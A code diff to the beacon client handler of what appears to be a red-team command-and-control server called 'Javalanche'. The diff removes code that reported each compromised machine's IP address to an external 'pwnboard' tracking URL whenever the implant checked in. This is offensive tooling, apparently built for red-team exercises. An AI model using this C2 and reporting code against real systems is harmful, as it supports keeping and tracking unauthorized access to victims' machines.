@@ -5,12 +5,6 @@ import Servers.keepAlive;
 import Servers.encryption.aes.*;
 
 import java.io.IOException;
-import java.net.HttpURLConnection;
-import java.net.MalformedURLException;
-import java.net.URI;
-import java.net.URISyntaxException;
-import java.net.URL;
-
 import org.json.JSONObject;
 
 public class BeaconClientHandler implements Runnable{
@@ -36,14 +30,6 @@ public class BeaconClientHandler implements Runnable{
     // Object lock used to make sure that this thread is able to safetly access the duplexer
     private Object sendLock;
 
-    // Variables used to send HTTP Requests to pwnboard. pwnboard is used to keep track of what machines red team still has access to.
-    private URI pwnboardUri = null;
-    private URL pwnboardUrl = null;
-    private HttpURLConnection pwnboardConnection = null;
-    private String pwnboardData;
-    private Object pwnBoardLock;
-    private pwnBoardRequest pwnBoardRequestObject;
-
     // Class used to do aes encryption
     private aes aes;
 
@@ -64,20 +50,6 @@ public class BeaconClientHandler implements Runnable{
         this.keepAliveClass = new keepAlive(this.duplexer, sendLock, true, false, aes);
         this.keepAliveThread = new Thread(keepAliveClass);
         this.aes = aes;
-
-        try{
-            this.pwnboardUri = new URI("https://margs.salsas.bar/pwn/boxaccess");
-            this.pwnboardUrl = this.pwnboardUri.toURL();
-        } catch (URISyntaxException e){
-            e.printStackTrace();
-        } catch (MalformedURLException e){
-            e.printStackTrace();
-        }
-        this.pwnboardData = "{\"ip\": \"" + IPAddress + "\", \"application\": \"Javalanche\", \"access_type\": \"beacon\"}";
-        //this.pwnboardData = "{\"ip\": \"10.1.1.1\", \"application\": \"Javalanche\", \"access_type\": \"beacon\"}";
-        this.pwnBoardLock = new Object();
-
-        this.pwnBoardRequestObject = new pwnBoardRequest(pwnboardUrl, pwnboardConnection, pwnboardData, pwnBoardLock);
     }
 
     protected void quit(String reason) throws IOException{
@@ -162,11 +134,6 @@ public class BeaconClientHandler implements Runnable{
                 // When the linux client disconnects, for some reason is just sends a lot of null messages over and over
                 if(response == null){
                     clientDisconnect(null);
-                }
-
-                // Every time we receive a message from our client, we want to notify pwnboard that we still have access to this machine
-                synchronized(pwnBoardLock){
-                    pwnBoardLock.notify();
                 }
 
                 // Send client response back to C2
